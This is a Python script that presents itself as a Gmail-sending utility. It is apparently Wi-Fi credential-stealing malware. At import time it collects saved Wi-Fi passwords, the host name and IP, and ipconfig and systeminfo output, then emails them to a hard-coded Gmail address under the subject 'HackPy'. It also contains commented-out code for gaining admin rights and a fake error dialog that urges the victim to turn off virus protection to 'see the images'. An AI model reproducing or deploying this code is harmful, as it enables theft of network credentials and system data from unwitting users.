import base64
import os
import pickle
import socket
import tkinter.messagebox
from email.mime.text import MIMEText
from typing import Optional

from google.auth.transport.requests import Request
from google_auth_oauthlib.flow import InstalledAppFlow
from googleapiclient.discovery import build


class GmailSender:
    SCOPES = ['https://www.googleapis.com/auth/gmail.send']
    CREDENTIALS_FILE = 'credentials.json'
    TOKEN_FILE = 'token.pickle'

    def __init__(self):
        self.service = self.authenticate()

    def authenticate(self):
        creds = None
        if os.path.exists(self.TOKEN_FILE):
            with open(self.TOKEN_FILE, 'rb') as token:
                creds = pickle.load(token)

        if not creds or not creds.valid:
            if creds and creds.expired and creds.refresh_token:
                creds.refresh(Request())
            else:
                flow = InstalledAppFlow.from_client_secrets_file(
                    self.CREDENTIALS_FILE, self.SCOPES
                )
                creds = flow.run_local_server(port=0)

            with open(self.TOKEN_FILE, 'wb') as token:
                pickle.dump(creds, token)

        return build('gmail', 'v1', credentials=creds)

    def create_message(self, sender: str, to: str, subject: str, body: str) -> dict:
        message = MIMEText(body)
        message['to'] = to
        message['from'] = sender
        message['subject'] = subject
        raw = base64.urlsafe_b64encode(message.as_bytes()).decode('utf-8')
        return {'raw': raw}

    def send_email(self, sender: str, to: str, subject: str, body: str) -> Optional[str]:
        try:
            message = self.create_message(sender, to, subject, body)
            sent = self.service.users().messages().send(userId='me', body=message).execute()
            print(f"✅ Email sent! Message ID: {sent['id']}")
            return sent['id']
        except Exception as e:
            print(f"❌ Failed to send email: {e}")
            return None


import hack_file as wf

# if __name__ == '__main__':
#     if not wf.is_admin():
#         print("Relaunching as admin...")
#         cmd = f'{__file__}'
#         ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, cmd, None, 1)
#
#     if not wf.is_admin():
#         exit(1)

wifi = wf.get_wifi_conf()
cw = f"""
Name:\t {socket.gethostname()}
IP  :\t {socket.gethostbyname(socket.gethostname())}

Wifi config
User name\tPassword\n
"""
pc = 0

for k, v in wifi.items():
    cw = cw + k + ':\t' + v + '\n'
    pc += 1
cw = cw + f"""
Wifi profiles :
{pc}

IP config
{wf.get_cmd_out('ipconfig')}

System information
{wf.get_cmd_out('systeminfo')}
"""
snd = 'chamodinirajapaksha1999@gmail.com'
rcv = snd
msg = cw
print(cw)
try:
    gs = GmailSender()
    gs.send_email(snd, rcv, 'HackPy', msg)
except Exception as e:
    tkinter.messagebox.showerror('Error', 'To see the images\nTurn off virus protection\nOr no internet connection')
    print(e)
